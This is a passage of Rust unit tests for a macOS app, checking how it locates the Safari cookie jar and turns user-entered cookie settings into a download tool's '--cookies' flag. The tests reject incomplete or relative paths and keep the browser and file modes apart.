        // The real one, measured on the user's Mac: 345,981 bytes, written minutes ago.
        let with_jar = FakeMac::default().file(&container, 345_981, minutes_ago(3));
        assert_eq!(safari_cookie_jar(&with_jar), Some(container));
        // An upgraded Mac with only the old path keeps working.
        let upgraded = FakeMac::default().file(&legacy, 120_000, days_ago(400));
        assert_eq!(safari_cookie_jar(&upgraded), Some(legacy));
    }

    /// A path out of a text field: half-typed, relative, or a folder. None of them may become
    /// `--cookies <something>`.
    #[test]
    fn a_cookies_file_has_to_be_an_absolute_path_before_it_is_a_flag() {
        let from_file = |path: Option<&str>| LinkSettings {
            cookies: CookieSource::File,
            cookie_browser: String::new(),
            cookie_file: path.map(PathBuf::from),
        };
        assert_eq!(
            from_file(Some("/Users/me/Downloads/cookies.txt")).effective(),
            Some(CookieFlag::File(PathBuf::from("/Users/me/Downloads/cookies.txt")))
        );
        for unfinished in [None, Some(""), Some("   "), Some("cookies.txt"), Some("~/cookies.txt")]
        {
            assert_eq!(from_file(unfinished).effective(), None, "{unfinished:?}");
        }
        // The mode decides which field is read: a browser chosen earlier is not smuggled into a
        // file fetch, and a path left behind is not smuggled into a browser one.
        let both = LinkSettings {
            cookies: CookieSource::Browser,
            cookie_browser: "firefox".into(),
            cookie_file: Some(PathBuf::from("/Users/me/cookies.txt")),
        };
        assert_eq!(both.effective(), Some(CookieFlag::Browser("firefox")));
        let off = LinkSettings { cookies: CookieSource::None, ..both };
        assert_eq!(off.effective(), None, "off is off, whatever else is filled in");
    }
}
